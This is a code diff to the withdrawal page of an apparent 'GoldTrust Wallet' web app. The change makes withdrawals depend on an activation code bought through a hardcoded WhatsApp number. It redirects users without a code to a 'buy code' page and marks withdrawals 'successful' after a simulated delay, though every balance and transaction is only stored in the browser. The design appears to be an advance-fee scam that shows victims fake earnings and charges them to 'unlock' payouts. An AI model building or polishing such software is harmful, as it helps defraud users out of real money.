@@ -17,6 +17,7 @@ export default function Withdraw() {
   const [account, setAccount] = useState('');
   const [bank, setBank] = useState('');
   const [amount, setAmount] = useState('');
+  const [code, setCode] = useState(''); // <-- ADDED: single-page code input
   const [loading, setLoading] = useState(false);
   const [balance, setBalance] = useState(0);
   const [recentTx, setRecentTx] = useState([]);
@@ -35,8 +36,7 @@ export default function Withdraw() {
     setBalance(Number(u.balance || loadBalance() || 0));
 
     const tx = loadTx() || [];
-    const recent = tx
-      .filter(t=> t.type === 'withdraw')
+    const recent = tx.filter(t=> t.type === 'withdraw')
       .sort((a,b)=> new Date(b.created_at) - new Date(a.created_at));
     setRecentTx(recent.slice(0,3));
 
@@ -57,16 +57,27 @@ export default function Withdraw() {
     }
 
     const amt = Number(amount);
-    if(!account || !bank || !amt) return alert('Complete all fields');
+    if(!account || !bank || !amt || !code) return alert('Complete all fields');
     if(amt > balance) return alert('Insufficient balance');
 
     setLoading(true);
 
     setTimeout(()=>{
+      // VERIFY CODE (local check)
+      // expecting activation code stored in localStorage under 'gt_activation_code'
+      const VALID_CODE = localStorage.getItem('gt_activation_code');
+      if (!VALID_CODE || String(code).trim() !== String(VALID_CODE).trim()) {
+        setLoading(false);
+        alert('❌ Invalid activation code. You will be redirected to buy a code.');
+        router.push('/buy-code');
+        return;
+      }
+
+      // build transaction with meta keys so history/receipt can read beneficiary details
       const txPayload = {
         type: 'withdraw',
         amount: amt,
-        status: 'pending',
+        status: 'successful', // mark successful because code verified here
         created_at: new Date().toISOString(),
         fullName: user.fullName || '',
         phone: user.phone || '',
@@ -78,27 +89,24 @@ export default function Withdraw() {
         }
       };
 
-      savePendingWithdraw({
-        account,
-        bank,
-        amount: amt,
-        meta: { initiatedBy: user.fullName }
-      });
+      // save pending withdraw separately for verification step (kept for compatibility)
+      savePendingWithdraw({ account, bank, amount: amt, meta: { initiatedBy: user.fullName } });
 
+      // append transaction to history
       saveTx(txPayload);
 
-      // ⏰ START 1-HOUR COUNTDOWN AFTER SUCCESSFUL WITHDRAWAL
+      // ⏰ START 10-MINUTE COUNTDOWN AFTER SUCCESSFUL WITHDRAWAL
       try {
         localStorage.setItem(
           'gt_restriction_end',
-          Date.now() + (60 * 60 * 1000) // 1 hour
+          Date.now() + (10 * 60 * 1000) // 10 minutes
         );
       } catch (e) {}
 
       setLoading(false);
-      alert(`✅ Withdrawal request of ₦${amt.toLocaleString()} submitted!\nProceed to code verification.`);
-      router.push('/verify-code');
-    }, 3000);
+      alert(`✅ Withdrawal of ₦${amt.toLocaleString()} successful!`);
+      router.push('/dashboard');
+    }, 3000); // simulate short processing
   };
 
   if(!user) return (
@@ -143,12 +151,20 @@ export default function Withdraw() {
           onChange={e=>setAmount(e.target.value)}
         />
 
+        {/* <-- ADDED: code input on same page */}
+        <input
+          className="input"
+          placeholder="Enter Activation Code"
+          value={code}
+          onChange={e=>setCode(e.target.value)}
+        />
+
         <button
           className={`btn bg-gradient-to-r from-blue-500 to-blue-600 text-white px-6 py-3 rounded-xl shadow-md hover:scale-105 transition-transform ${loading?'opacity-50 cursor-not-allowed':''}`}
           onClick={proceed}
           disabled={loading}
         >
-          {loading ? 'Processing withdrawal...' : 'Proceed to Code Verification'}
+          {loading ? 'Processing withdrawal...' : 'Withdraw Now'}
         </button>
 
         {recentTx.length>0 && (
@@ -191,7 +207,7 @@ export default function Withdraw() {
               style={{width:'100%', fontWeight:800}}
               onClick={()=>{
                 window.location.href =
-                  'https://wa.me/234XXXXXXXXXX?text=Hello%2C%20I%20want%20to%20activate%20my%20GoldTrust%20Wallet%20account';
+                  'https://wa.me/2348161662371?text=Hello%2C%20I%20want%20to%20activate%20my%20GoldTrust%20Wallet%20account';
               }}
             >
               👉 CLICK TO ACTIVATE
